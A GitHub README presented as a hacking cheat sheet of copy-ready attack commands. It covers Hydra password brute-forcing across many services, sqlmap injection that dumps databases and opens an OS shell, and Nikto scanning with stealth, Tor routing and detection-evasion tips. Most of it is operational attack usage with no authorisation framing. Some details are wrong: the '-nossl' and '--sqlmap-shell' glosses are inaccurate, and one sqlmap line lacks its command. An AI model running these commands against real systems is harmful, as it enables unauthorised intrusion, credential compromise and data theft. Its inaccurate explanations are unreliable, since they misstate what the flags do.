# hack-Cheat-Sheets
This repo has a collection of snippets of codes and commands to help our lives! The main purpose is not be a crutch, this is a way to do not waste our precious time.


## Resources
i find these Repos very userfull 
- [Kali linux cheat sheet](https://github.com/NoorQureshi/kali-linux-cheatsheet)
- [Pentesting Tactics](https://hackviser.com/tactics/pentesting)
- [Windows Registry Attacks Cheat Sheet](https://infoseclabs.io/wp-content/uploads/simple-file-list/Windows-Registry-Attacks-Cheat-Sheet.pdf)

---
## Ninja Table
1. [Hydra cheat sheet](#1-Hydra-Cheat-Sheet)
2. [SQLmap Cheat sheet](#2-SQLmap-cheat-sheet)
3. [Nikto cheat sheet](#3-Essential-Nikto-Commands-for-Hackers)


---




## 1. Hydra Cheat Sheet


## RDP
```bash
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
```

## SSH

```bash
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
```

## SMB

```bash
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V
```

## FTP

```bash
hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V
```

## HTTP Basic Auth

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
```

## HTTP POST

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form \
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

## IMAP

```bash
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```

## MySQL

```bash
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
```

## POP3

```bash
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
```

## Redis

```bash
hydra -P password.txt redis://10.0.2.5 -V
```

## Rexec

```bash
hydra -l root -P password.txt rexec://10.0.2.5 -V
```

## Rlogin

```bash
hydra -l root -P password.txt rlogin://10.0.2.5 -V
```

## RSH

```bash
hydra -L username.txt rsh://10.0.2.5 -V
```

## RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

## SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V  # Port 587 for SMTP with SSL
```

## Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
```

## VNC

```bash
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt -s <PORT> <IP> vnc
```


## 2. SQLmap cheat sheet

### Installation 

    sudo apt install sqlmap

### Automatic Analysis

    sqlmap -u “https://target.com/page/”

> Use this method to get basic info if that particular page is vulnerable or not, Note its not always reliable


### Specifying the GET Request Parameter

    sqlmap -u “https://target.com/page?para1=val1&para2=val2”

> Use this when you are sure that when the website accepts that particular parameter

### Asking SQL map to Check if particular parameter is exploitable

    “https://target_site.com/page?p1=value1&p2=value2” -p p1

> Here P1 is the first parameter and using that -p followed by p1 asks SQLmap to check that particular parameter alone.


### Specifying the POST Request Parameter

    sqlmap -u “https://target.com/page/” --data="p1=val1&p2=val2"

> This is very important since lot of web apps use POST request instead of GET request

### When a web app uses Authenticated Session With Cookie or Header

    sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --cookie="Session_Cookie_Value"

> Get the Cookie Session for the browser's developer tools in the application section


    sqlmap -u “https://target_site.com/page/” --data="p1=val1&p2=val2" --headers="<------>"

##  Once you success fully exploit there is session thats created by SQLmap which you can use for direct connection

    sqlmap -u “https://target.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs

> You can use this file from the home path of the SQLMap tool’s output directory.


## Exploitation Commands

If the SQL injection vulnerability is observed **positive** then you can use the following commands to Exploit the SQL injection vulnerability.

### List the databases

    sqlmap -u “https://target_site.com/page?p1=value1” --dbs

### List Tables of a particular Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables

### List Columns of Table of a Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns

### Dump Specific Data of Columns of Table  of Database 

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump

### Fully Dump Table TARGET_TABLE of Database TARGET_DB

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump

### Dump full Database

    sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump

### Run Custom Query on your own

    sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"

### Get  access to OS Shell

    sqlmap -u “https://target_site.com/page?p1=value1” --os-shell

### Get access to SQL shell

    sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell



# 3. Essential Nikto Commands for Hackers

## Core Reconnaissance Commands

### 1. **Basic Target Assessment**
```bash
# Quick vulnerability scan
nikto -h target.com

# SSL-enabled scan
nikto -h https://target.com -ssl
```

### 2. **Stealth & Evasion**
```bash
# Stealth scan with custom user agent
nikto -h target.com -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Slow scan to avoid detection
nikto -h target.com -T 012 -timeout 30

# Through proxy (Tor/Burp)
nikto -h target.com -useproxy http://127.0.0.1:8080
```

### 3. **Authentication Bypass Testing**
```bash
# Test with credentials
nikto -h target.com -id admin:admin

# Session-based scanning
nikto -h target.com -C "PHPSESSID=abc123; auth_token=xyz789"

# Custom headers for bypass
nikto -h target.com -H "X-Forwarded-For: 127.0.0.1"
```

### 4. **High-Value Vulnerability Hunting**
```bash
# Focus on critical vulns (RCE, SQLi, Auth bypass)
nikto -h target.com -Tuning 8,9,a

# Comprehensive security audit
nikto -h target.com -Tuning 1,2,3,4,5,6,7,8,9,0,a,b,c

# Information disclosure focus
nikto -h target.com -Tuning 3,b
```

### 5. **Multi-Target Operations**
```bash
# Scan multiple targets from file
nikto -h targets.txt

# Network range scanning
nikto -h 192.168.1.1-254 -p 80,443

# Subnet scanning
nikto -h 10.0.0.0/24
```

### 6. **Advanced Enumeration**
```bash
# Directory-specific scanning
nikto -h target.com -root /admin

# Multiple ports
nikto -h target.com -p 80,443,8080,8443

# Skip SSL cert verification
nikto -h https://target.com -nossl
```

### 7. **Output for Reporting**
```bash
# HTML report for clients
nikto -h target.com -Format htm -o report.html

# Machine-readable XML
nikto -h target.com -Format xml -o results.xml

# Quick text output
nikto -h target.com -o findings.txt
```

## Critical One-Liners

### **The Penetration Tester's Favorite**
```bash
nikto -h target.com -Tuning 1,2,3,8,9,a -ssl -Format htm -o pwn_results.html
```
*Scans for file disclosure, misconfig, info leak, RCE, SQLi, and auth bypass*

### **The Stealth Operator**
```bash
nikto -h target.com -T 012 -timeout 30 -useragent "Mozilla/5.0" -useproxy http://127.0.0.1:9050
```
*Low-profile scan through Tor with realistic user agent*

### **The Bug Bounty Hunter**
```bash
nikto -h target.com -Tuning 3,4,5,9 -ssl -root /api -Format xml -o bounty.xml
```
*Focuses on info disclosure, XSS, file retrieval, and SQLi in API endpoints*

### **The Red Teamer**
```bash
nikto -h target.com -Tuning 8,a -C "session=admin_token" -H "X-Real-IP: 127.0.0.1"
```
*Targets RCE and auth bypass with session hijacking and IP spoofing*

## What Hackers Look For

### **Immediate Exploitation Opportunities**
- Default credentials (admin/admin, root/root)
- Unprotected admin panels
- File upload vulnerabilities
- Command injection points
- SQL injection entry points

### **Information Gathering Gold**
- Server versions and technologies
- Directory structures
- Configuration file exposure
- Backup file locations
- Source code leaks

### **Privilege Escalation Paths**
- Authentication bypass methods
- Session management flaws
- Access control misconfigurations
- Administrative interface exposure

## Pro Tips for Real Engagements

### **Avoid Detection**
```bash
# Randomize timing
nikto -h target.com -timeout $(shuf -i 10-30 -n 1)

# Use residential proxy chains
nikto -h target.com -useproxy http://proxy1:8080
```

### **Maximum Coverage**
```bash
# Full port scan integration
for port in $(nmap -p- --open target.com | grep open | cut -d/ -f1); do
    nikto -h target.com -p $port
done
```

### **Automated Reporting**
```bash
# Quick findings extract
nikto -h target.com | grep -E "(OSVDB|CVE|+ |ERROR)" > critical_findings.txt
```

## The Hacker's Nikto Workflow

1. **Reconnaissance**: `nikto -h target.com -Tuning b`
2. **Vulnerability Discovery**: `nikto -h target.com -Tuning 8,9,a`  
3. **Information Gathering**: `nikto -h target.com -Tuning 1,2,3`
4. **Exploitation Prep**: `nikto -h target.com -root /admin -C "session_token"`

---







